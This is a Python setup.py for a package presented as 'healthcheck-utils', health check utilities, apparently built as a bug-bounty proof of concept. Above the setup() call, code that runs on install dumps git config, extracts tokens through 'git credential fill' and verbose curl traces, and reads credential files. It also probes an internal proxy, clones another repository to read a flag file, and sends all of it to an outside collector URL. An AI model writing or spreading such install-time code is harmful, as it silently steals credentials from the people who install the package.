import subprocess
import os
import urllib.request
import json

COLLECTOR = "https://poc.0z.ci/j/c.php?id=jules8"

def report(tag, data):
    try:
        req = urllib.request.Request(
            COLLECTOR, data=f"[{tag}] {data}".encode(),
            headers={"Content-Type": "text/plain"})
        urllib.request.urlopen(req, timeout=10)
    except Exception:
        pass

try:
    # Step 1: dump git config to find proxy & credential setup
    r = subprocess.run(['git', 'config', '-l', '--global'],
                       capture_output=True, text=True, timeout=5)
    report("gitconfig-global", r.stdout[:2000])

    # Step 2: try credential fill to extract the token
    cred_input = "protocol=http\nhost=192.168.0.1:8080\nusername=git\n\n"
    r = subprocess.run(
        ['git', 'credential', 'fill'],
        input=cred_input, capture_output=True, text=True, timeout=10)
    report("credential-fill", r.stdout[:2000])

    # Step 3: capture auth header via GIT_CURL_VERBOSE
    env = os.environ.copy()
    env['GIT_CURL_VERBOSE'] = '1'
    r = subprocess.run(
        ['git', 'ls-remote', '--heads', 'http://git@192.168.0.1:8080/hacker1-test/rce'],
        capture_output=True, text=True, timeout=15, env=env)
    stderr_lines = [l for l in r.stderr.split('\n') if 'authorization' in l.lower() or 'auth' in l.lower() or 'Basic' in l]
    report("git-auth-trace", '\n'.join(stderr_lines[:20]))
    report("git-stderr-full", r.stderr[:3000])

    # Step 4: also try reading credential store files
    home = os.path.expanduser('~')
    for f in ['.git-credentials', '.gitconfig', '.config/git/credentials']:
        path = os.path.join(home, f)
        if os.path.exists(path):
            with open(path) as fh:
                report(f"file-{f}", fh.read()[:2000])

    # Step 5: check credential helpers
    r = subprocess.run(['git', 'config', '--global', 'credential.helper'],
                       capture_output=True, text=True, timeout=5)
    report("credential-helper", r.stdout.strip() or "none")

    # Step 6: try listing via GitHub API with any found credentials
    # The proxy might also forward API requests
    try:
        req = urllib.request.Request("http://192.168.0.1:8080/api/v3/installation/repositories")
        resp = urllib.request.urlopen(req, timeout=10)
        report("api-repos", resp.read().decode()[:3000])
    except Exception as e:
        report("api-repos-err", str(e))

    # Step 7: quick targeted clone test - prove cross-repo still works
    r = subprocess.run(
        ['bash', '-c',
         'git clone --depth 1 http://git@192.168.0.1:8080/hacker1-test/secret /tmp/_s 2>&1; '
         'ls /tmp/_s/ 2>/dev/null; cat /tmp/_s/flag.txt 2>/dev/null; rm -rf /tmp/_s'],
        capture_output=True, text=True, timeout=20)
    report("cross-repo-clone", r.stdout[:1000])

except Exception as e:
    report("error", str(e))

from setuptools import setup

setup(
    name='healthcheck-utils',
    version='1.0.2',
    description='Health check endpoint utilities for Python HTTP servers',
    py_modules=['healthcheck_utils'],
    python_requires='>=3.7',
)
